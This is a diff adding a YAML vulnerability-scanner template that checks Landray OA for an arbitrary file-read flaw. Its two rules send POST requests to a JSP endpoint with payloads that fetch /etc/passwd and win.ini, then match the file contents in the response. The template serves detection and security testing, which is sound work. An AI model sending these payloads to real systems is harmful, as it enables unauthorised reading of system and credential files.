@@ -1,0 +1,27 @@
+name: landray_OA_arbitrary_file_read
+transport: http
+set: {}
+detail:
+  dock: app="landray-OA"
+  product: landray-OA
+  homepage: http://landrayln.com/
+  impact: <p>The attacker can read arbitrary files.<br></p>
+  description: There is an arbitrary file reading vulnerability in landray-OA.
+rules:
+  r1:
+    method: POST
+    path: /sys/ui/extend/varkind/custom.jsp
+    follow_redirects: false
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "var={\"body\":{\"file\":\"file:///etc/passwd\"}}"
+    expression: response.status == 200 && response.body.bcontains(b"root:")
+  r2:
+    method: POST
+    path: /sys/ui/extend/varkind/custom.jsp
+    follow_redirects: false
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "var={\"body\":{\"file\":\"file:///windows/win.ini\"}}"
+    expression: response.status == 200 && response.body.bcontains(b"; for 16-bit app support")
+expression: r1() || r2()
